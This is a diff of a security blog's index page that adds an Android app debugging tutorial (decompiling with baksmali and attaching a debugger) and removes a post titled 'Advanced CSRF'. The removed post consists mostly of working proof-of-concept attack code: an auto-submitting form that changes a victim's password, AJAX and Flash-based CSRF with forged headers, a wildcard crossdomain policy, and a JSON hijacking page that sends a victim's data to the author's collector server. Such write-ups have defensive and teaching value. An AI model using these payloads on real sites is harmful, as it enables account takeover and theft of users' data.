@@ -263,6 +263,135 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/08/Android-Dynamic-Debug/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/09/08/Android-Dynamic-Debug/" itemprop="url">
+                  Android Dynamic Debug
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-08T12:31:04+08:00">
+                2016-09-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Install-Tools"><a href="#0x01-Install-Tools" class="headerlink" title="0x01 Install Tools"></a>0x01 Install Tools</h3><p>1) smalidea<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget https://bitbucket.org/JesusFreke/smali/downloads/smalidea-0.03.zip</span><br></pre></td></tr></table></figure></p>
+<p>2) IDEA install smalidea<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Preferences &gt;&gt; Plugins &gt;&gt; Install plugin from disk</span><br></pre></td></tr></table></figure></p>
+<p>3) baksmali<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; wget https://bitbucket.org/JesusFreke/smali/downloads/baksmali-2.1.3.jar -O baksmali.jar</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02-Usage"><a href="#0x02-Usage" class="headerlink" title="0x02 Usage"></a>0x02 Usage</h3><p><strong>step 1</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; java -jar baksmali.jar app.apk -o app/src</span><br></pre></td></tr></table></figure></p>
+<p><strong>step 2</strong></p>
+<p>导入到Android Studio</p>
+<p><strong>step 3</strong></p>
+<p>Run &gt;&gt; Edit configuration &gt;&gt; 选择+号 &gt;&gt; Remote  &gt;&gt; 修改Port:8700</p>
+<p><strong>step 4</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; ~/Library/Android/sdk/tools/monitor</span><br></pre></td></tr></table></figure></p>
+<p><strong>step 5</strong></p>
+<p>USB接入android手机，在monitor程序中的Devices会看到手机驱动在线，选择你要调试的android程序包名</p>
+<p><strong>step 6</strong></p>
+<p>在android studio中在想要下断点的smali代码中增加一个断点，然后按快捷键Control+D</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/05/SQLMAP-Tamper/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1804,143 +1933,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/06/30/Advanced-CSRF/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/06/30/Advanced-CSRF/" itemprop="url">
-                  Advanced CSRF
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-30T18:52:37+08:00">
-                2016-06-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="example-CSRF"><a href="#example-CSRF" class="headerlink" title="example CSRF"></a>example CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://taget.com/modify&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;xl7dev&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;password&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      document.forms[0].submit();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="AJAX-CSRF"><a href="#AJAX-CSRF" class="headerlink" title="AJAX CSRF"></a>AJAX CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function csrfAjax()&#123;</span><br><span class="line">    if (window.XMLHttpRequest)&#123;</span><br><span class="line">        xmlhttp=new XMLHttpRequest();</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.onreadystatechange=function()&#123;</span><br><span class="line">        if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;</span><br><span class="line">            document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;POST&quot;,&quot;http://target.com/csrf.php&quot;,true);</span><br><span class="line">    xmlhttp.setRequestHeader(&quot;X-Requested-With&quot;, &quot;XMLHttpRequest&quot;);</span><br><span class="line">    xmlhttp.send(&quot;query=123hacked123&amp;primary            Type=mixed&amp;sortBy=date&amp;intl=true&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Bypass-Header-via-Flash"><a href="#Bypass-Header-via-Flash" class="headerlink" title="Bypass Header via Flash"></a>Bypass Header via Flash</h3><blockquote>
-<p>crossdomain.xml</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">&lt;allow-access-from domain=&quot;*&quot;/&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>flashcsrfexp.as</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class forge_headers&#123;</span><br><span class="line">    function forge_headers()&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    static function main(mc)&#123;</span><br><span class="line">        var req:LoadVars=new LoadVars();</span><br><span class="line">        // GET method</span><br><span class="line">        //req.addRequestHeader(&quot;Foo&quot;,&quot;Bar&quot;);</span><br><span class="line">        //req.addRequestHeader(&quot;Host:&quot;,&quot;www.target.com&quot;);</span><br><span class="line">        //req.send(&quot;http://www.target.com/csrf.php?p1=v1&amp;p2=v2&quot;,&quot;&quot;,&quot;GET&quot;);</span><br><span class="line">        //req.send(&quot;http://www.target.com/csrf.php&quot;,&quot;&quot;,&quot;GET&quot;)</span><br><span class="line">        // POST method</span><br><span class="line">        req.addRequestHeader(&quot;Bar&quot;,&quot;BarFoo&quot;);</span><br><span class="line">        req.addRequestHeader(&quot;Referer:http://www.target.com/csrf.php&quot;,&quot;&quot;)</span><br><span class="line">        req.addRequestHeader(&quot;Host:&quot;,&quot;www.target.com&quot;);</span><br><span class="line">        req.decode(&quot;username=xl7dev&amp;password=pass&quot;);</span><br><span class="line">        req.send(&quot;http://www.target.com/csrf.php&quot;,&quot;&quot;,&quot;POST&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Usage：url=[post请求的地址]&amp;[参数值用&amp;分开]</p>
-</blockquote>
-<p>FlashCSRFexp.swf?url=<a href="http://www.xx.xx/x.jsp?&amp;xx=xx&amp;xx=xx&amp;xx=xx&amp;xx=xx" target="_blank" rel="external">http://www.xx.xx/x.jsp?&amp;xx=xx&amp;xx=xx&amp;xx=xx&amp;xx=xx</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">   import flash.display.Sprite;</span><br><span class="line">   import flash.net.URLRequest;</span><br><span class="line">   import flash.net.URLRequestMethod;</span><br><span class="line">   import flash.net.sendToURL;</span><br><span class="line">   </span><br><span class="line">   public class FlashCSRFexp extends Sprite</span><br><span class="line">   &#123;</span><br><span class="line">       </span><br><span class="line">      public function FlashCSRFexp()</span><br><span class="line">      &#123;</span><br><span class="line">         var key:* = null;</span><br><span class="line">         var emailtargetURL:String = null;</span><br><span class="line">         var emailrequest:URLRequest = null;</span><br><span class="line">         var datastring:String = null;</span><br><span class="line">         super();</span><br><span class="line">         var postdata:Object = this.loaderInfo.parameters;</span><br><span class="line">         var data:Array = [];</span><br><span class="line">         for(key in postdata)</span><br><span class="line">         &#123;</span><br><span class="line">            if(key != &quot;url&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">               data.push(key + &quot;=&quot; + postdata[key]);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         emailtargetURL = postdata.url;</span><br><span class="line">         emailrequest = new URLRequest(emailtargetURL);</span><br><span class="line">         emailrequest.method = URLRequestMethod.POST;</span><br><span class="line">         datastring = data.join(&quot;&amp;&quot;);</span><br><span class="line">         emailrequest.data = datastring;</span><br><span class="line">         sendToURL(emailrequest);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="JSON-HiJacking"><a href="#JSON-HiJacking" class="headerlink" title="JSON HiJacking"></a>JSON HiJacking</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">    function jsonpCallback(result) &#123; </span><br><span class="line">        alert(result.a); </span><br><span class="line">        alert(result.b);</span><br><span class="line">        alert(result.c); </span><br><span class="line">        for(var i in result) &#123; </span><br><span class="line">            alert(i+&quot;:&quot;+result[i]);//循环输出a:1,b:2,etc. </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.target.com/json.php?callback=jsonpCallback&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>POC</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta content=&quot;text/html; charset=utf-8&quot; http-equiv=&quot;Content-Type&quot; /&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt; </span><br><span class="line">    function hijack(result) &#123; </span><br><span class="line">        var data = &apos;&apos;;</span><br><span class="line">        for(var i in result) &#123;</span><br><span class="line">            data += i + &apos;:&apos; + result[i];</span><br><span class="line">        &#125;</span><br><span class="line">        new Image().src = &quot;http://blog.safebuff.com/JSONHiJacking.php?data=&quot; + escape(data);//把数据发送到攻击者服务器上</span><br><span class="line">    &#125; </span><br><span class="line">&lt;/script&gt; </span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.target.com/services.php?callback=hijack&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="CSRF-via-XSS"><a href="#CSRF-via-XSS" class="headerlink" title="CSRF via XSS"></a>CSRF via XSS</h3><p><a href="http://blog.safebuff.com/2016/05/26/Bypass-CSRF-Protection-via-XSS/">CSRF via XSS</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1986,7 +1978,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">71</span>
+              <span class="site-state-item-count">72</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1996,7 +1988,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-count">57</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
@@ -2102,7 +2094,7 @@
         <div class="copyright" >
   
   &copy;  2015 - 
-  <span itemprop="copyrightYear">2016</span>
+  <span itemprop="copyrightYear">2017</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
